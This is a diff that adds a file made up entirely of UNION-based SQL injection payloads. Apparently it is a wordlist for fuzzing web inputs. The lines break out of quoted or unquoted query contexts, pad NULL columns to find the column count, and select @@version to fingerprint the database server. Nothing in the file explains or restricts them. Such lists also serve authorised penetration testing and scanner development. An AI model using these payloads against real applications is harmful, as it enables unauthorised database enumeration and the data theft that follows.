@@ -1,0 +1,40 @@
+UNION SELECT NULL --
+UNION SELECT NULL -- -
+UNION SELECT @@version -- -
+UNION SELECT NULL, @@version -- -
+UNION SELECT NULL, @@version --
+UNION SELECT NULL, NULL, @@version -- -
+UNION SELECT NULL, NULL, @@version --
+UNION SELECT NULL, NULL, NULL, @@version -- -
+UNION SELECT NULL, NULL, NULL, @@version -- 
+UNION SELECT NULL, NULL, NULL, NULL, @@version -- -
+UNION SELECT NULL, NULL, NULL, NULL, @@version -- 
+UNION SELECT NULL, NULL, NULL, NULL, NULL, @@version -- -
+UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, @@version -- -
+UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, @@version --
+UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, @@version --
+UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, @@version -- -
+' union select NULL -- -
+' union select NULL --
+' union (select @@version) --
+' union (select @@version) -- -
+' union (select NULL, (select @@version)) -- -
+' union (select NULL, NULL, (select @@version)) -- -
+' union (select NULL, NULL, NULL,  (select @@version)) -- -
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) -- -
+' union (select NULL, (select @@version)) -- -
+' union (select NULL, NULL, (select @@version)) -- -
+' union (select NULL, NULL, NULL,  (select @@version)) -- -
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) -- -
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) -- -
+' union (select NULL, NULL, NULL, NULL,  NULL, NULL, (select @@version)) -- -
+' union (select NULL, NULL, NULL, NULL,  NULL, NULL, NULL, (select @@version)) -- -
+" union (select @@version) -- -
+" union (select NULL, (select @@version)) -- - 
+" union (select NULL, NULL, (select @@version)) -- - 
+" union (select NULL, NULL, NULL,  (select @@version)) -- -
+" union (select NULL, NULL, NULL, NULL,  (select @@version)) -- - 
+" union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) -- -
+" union (select NULL, NULL, NULL, NULL,  NULL, NULL, (select @@version)) -- -
+" union (select NULL, NULL, NULL, NULL,  NULL, NULL, NULL, (select @@version)) -- -
+" union (select NULL, NULL, NULL, NULL,  NULL, NULL, NULL, NULL, (select @@version)) -- -
